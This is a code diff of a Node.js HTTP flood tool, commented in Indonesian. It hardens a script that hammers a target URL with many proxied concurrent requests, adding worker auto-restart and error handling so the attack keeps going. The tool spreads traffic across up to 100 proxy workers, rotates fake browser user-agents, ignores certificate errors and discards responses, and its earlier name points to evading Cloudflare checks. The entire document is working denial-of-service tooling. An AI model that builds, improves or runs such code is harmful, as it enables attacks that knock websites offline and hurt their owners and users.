@@ -1,6 +1,4 @@
-// high_rps_no_cf.js - Request tanpa cf_clearance
-// Usage: node high_rps_no_cf.js <target_url> <concurrent_connections> [rps_limit] [proxy_file]
-
+// high_rps_stable.js - Stabil dengan auto-restart worker
 const fs = require('fs');
 const https = require('https');
 const http = require('http');
@@ -11,7 +9,7 @@ const { Worker, isMainThread, parentPort, workerData } = require('worker_threads
 const args = process.argv.slice(2);
 if (args.length < 2) {
     console.log(`
-Usage: node high_rps_no_cf.js <target_url> <concurrent_connections> [rps_limit] [proxy_file]
+Usage: node high_rps_stable.js <target_url> <concurrent_connections> [rps_limit] [proxy_file]
 
 Options:
   target_url              Target URL (http://... atau https://...)
@@ -27,7 +25,6 @@ const CONCURRENT_PER_WORKER = parseInt(args[1], 10);
 const RPS_LIMIT = args[2] ? parseInt(args[2], 10) : 0;
 const PROXY_FILE = args[3] || 'proxy.txt';
 
-// Validasi URL
 let parsedTarget;
 try {
     parsedTarget = new URL(TARGET_URL);
@@ -37,7 +34,7 @@ try {
 }
 const isHttps = parsedTarget.protocol === 'https:';
 
-// Optimasi agent keep-alive
+// Agent options
 const AGENT_OPTIONS = {
     keepAlive: true,
     keepAliveMsecs: 1000,
@@ -46,7 +43,6 @@ const AGENT_OPTIONS = {
     timeout: 60000,
 };
 
-// Header dasar (random user-agent akan digenerate per request)
 const DEFAULT_HEADERS = {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     'Accept-Language': 'en-US,en;q=0.9',
@@ -68,73 +64,128 @@ try {
 } catch (err) {
     console.error(`[-] Gagal baca proxy: ${err.message}`);
     console.log('[!] Melanjutkan tanpa proxy (direct connection)');
-    PROXY_LIST = [null]; // satu entry dummy
+    PROXY_LIST = [null];
 }
 
-// ========== WORKER THREAD ==========
+// ========== MAIN THREAD ==========
 if (isMainThread) {
-    // Main thread: buat worker pool
-    const totalWorkers = Math.min(PROXY_LIST.length, 100); // maks 100 worker
+    // Tangani uncaught exception di main thread
+    process.on('uncaughtException', (err) => {
+        console.error('[Main] Uncaught Exception:', err);
+    });
+    process.on('unhandledRejection', (reason, promise) => {
+        console.error('[Main] Unhandled Rejection:', reason);
+    });
+
+    const totalWorkers = Math.min(PROXY_LIST.length, 100);
     console.log(`[+] Starting ${totalWorkers} workers, each with ${CONCURRENT_PER_WORKER} concurrent connections`);
 
-    const workers = [];
-    for (let i = 0; i < totalWorkers; i++) {
-        const proxy = PROXY_LIST[i % PROXY_LIST.length];
+    const workers = new Map(); // id -> { worker, proxy, restartCount }
+
+    function createWorker(index, proxy) {
         const worker = new Worker(__filename, {
             workerData: {
                 targetUrl: TARGET_URL,
                 proxy: proxy,
                 concurrent: CONCURRENT_PER_WORKER,
                 rpsLimit: RPS_LIMIT > 0 ? Math.floor(RPS_LIMIT / totalWorkers) : 0,
+                workerId: index,
             }
         });
+        const restartCount = 0;
+        workers.set(index, { worker, proxy, restartCount });
+
         worker.on('message', (msg) => {
-            console.log(`[Worker ${i}] ${msg}`);
+            console.log(`[Worker ${index}] ${msg}`);
         });
         worker.on('error', (err) => {
-            console.error(`[Worker ${i}] error: ${err.message}`);
+            console.error(`[Worker ${index}] error event: ${err.message}`);
         });
         worker.on('exit', (code) => {
-            if (code !== 0) console.error(`[Worker ${i}] exit code ${code}`);
+            console.error(`[Worker ${index}] exit with code ${code}`);
+            if (code !== 0) {
+                // Restart worker setelah 2 detik
+                console.log(`[Worker ${index}] restarting in 2 seconds...`);
+                setTimeout(() => {
+                    const data = workers.get(index);
+                    if (data) {
+                        const newRestartCount = (data.restartCount || 0) + 1;
+                        if (newRestartCount <= 10) {
+                            console.log(`[Worker ${index}] restart attempt ${newRestartCount}`);
+                            const newWorker = createWorker(index, data.proxy);
+                            workers.set(index, { worker: newWorker, proxy: data.proxy, restartCount: newRestartCount });
+                        } else {
+                            console.error(`[Worker ${index}] too many restarts, stopping.`);
+                            workers.delete(index);
+                        }
+                    }
+                }, 2000);
+            } else {
+                // Normal exit, hapus dari map
+                workers.delete(index);
+            }
         });
-        workers.push(worker);
+        return worker;
+    }
+
+    for (let i = 0; i < totalWorkers; i++) {
+        const proxy = PROXY_LIST[i % PROXY_LIST.length];
+        createWorker(i, proxy);
         // Jeda startup
         setTimeout(() => {}, 100);
     }
 
-    console.log(`[+] ${workers.length} workers running. Press Ctrl+C to stop.`);
+    console.log(`[+] ${totalWorkers} workers running. Press Ctrl+C to stop.`);
     process.on('SIGINT', () => {
         console.log('\n[!] Stopping workers...');
-        workers.forEach(w => w.terminate());
+        for (const { worker } of workers.values()) {
+            worker.terminate();
+        }
         process.exit(0);
     });
 } else {
-    // Worker thread
-    const { targetUrl, proxy, concurrent, rpsLimit } = workerData;
-    const parsedTarget = new URL(targetUrl);
+    // ========== WORKER THREAD ==========
+    const { targetUrl, proxy, concurrent, rpsLimit, workerId } = workerData;
+    
+    // Tangani error di worker agar tidak mati
+    process.on('uncaughtException', (err) => {
+        console.error(`[Worker ${workerId}] Uncaught Exception:`, err);
+        parentPort.postMessage(`CRASH: ${err.message}`);
+        process.exit(1);
+    });
+    process.on('unhandledRejection', (reason) => {
+        console.error(`[Worker ${workerId}] Unhandled Rejection:`, reason);
+        parentPort.postMessage(`CRASH: ${reason}`);
+        process.exit(1);
+    });
+
+    let parsedTarget;
+    try {
+        parsedTarget = new URL(targetUrl);
+    } catch (e) {
+        parentPort.postMessage(`Invalid URL: ${e.message}`);
+        process.exit(1);
+    }
     const isHttps = parsedTarget.protocol === 'https:';
 
-    // Agent dengan atau tanpa proxy
     let agent;
     if (proxy) {
         try {
             const { HttpsProxyAgent } = require('https-proxy-agent');
             agent = new HttpsProxyAgent(proxy, AGENT_OPTIONS);
         } catch (err) {
-            parentPort.postMessage(`Gagal load proxy agent: ${err.message}`);
+            parentPort.postMessage(`Proxy agent error: ${err.message}`);
             process.exit(1);
         }
     } else {
         agent = isHttps ? new https.Agent(AGENT_OPTIONS) : new http.Agent(AGENT_OPTIONS);
     }
 
-    // Random User-Agent
     function randomUA() {
         const chromeVer = Math.floor(Math.random() * 30) + 90;
         return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer}.0.0.0 Safari/537.36`;
     }
 
-    // Fungsi request
     async function doRequest() {
         const headers = {
             ...DEFAULT_HEADERS,
@@ -149,12 +200,12 @@ if (isMainThread) {
             headers: headers,
             agent: agent,
             timeout: 10000,
-            rejectUnauthorized: false, // abaikan error sertifikat
+            rejectUnauthorized: false,
         };
         return new Promise((resolve) => {
             const protocol = isHttps ? https : http;
             const req = protocol.request(options, (res) => {
-                res.resume(); // buang response body
+                res.resume();
                 resolve({ status: res.statusCode, success: res.statusCode < 400 });
             });
             req.on('error', (err) => {
@@ -168,7 +219,6 @@ if (isMainThread) {
         });
     }
 
-    // Rate limiting per worker
     let lastRequestTime = 0;
     const minInterval = rpsLimit > 0 ? 1000 / rpsLimit : 0;
 
@@ -189,26 +239,31 @@ if (isMainThread) {
         }
     }
 
-    // Loop concurrent dengan pool
     async function runWorker() {
         const promises = [];
         while (true) {
-            while (promises.length < concurrent) {
-                const p = throttledRequest().finally(() => {
-                    const idx = promises.indexOf(p);
-                    if (idx !== -1) promises.splice(idx, 1);
-                });
-                promises.push(p);
+            try {
+                while (promises.length < concurrent) {
+                    const p = throttledRequest().finally(() => {
+                        const idx = promises.indexOf(p);
+                        if (idx !== -1) promises.splice(idx, 1);
+                    });
+                    promises.push(p);
+                }
+                if (promises.length >= concurrent) {
+                    await Promise.race(promises);
+                }
+                await new Promise(r => setTimeout(r, 1));
+            } catch (err) {
+                parentPort.postMessage(`Loop error: ${err.message}`);
+                // Jangan exit, lanjutkan loop
+                await new Promise(r => setTimeout(r, 1000));
             }
-            if (promises.length >= concurrent) {
-                await Promise.race(promises);
-            }
-            await new Promise(r => setTimeout(r, 1));
         }
     }
 
     runWorker().catch(err => {
-        console.error(err);
+        parentPort.postMessage(`Fatal: ${err.message}`);
         process.exit(1);
     });
 }
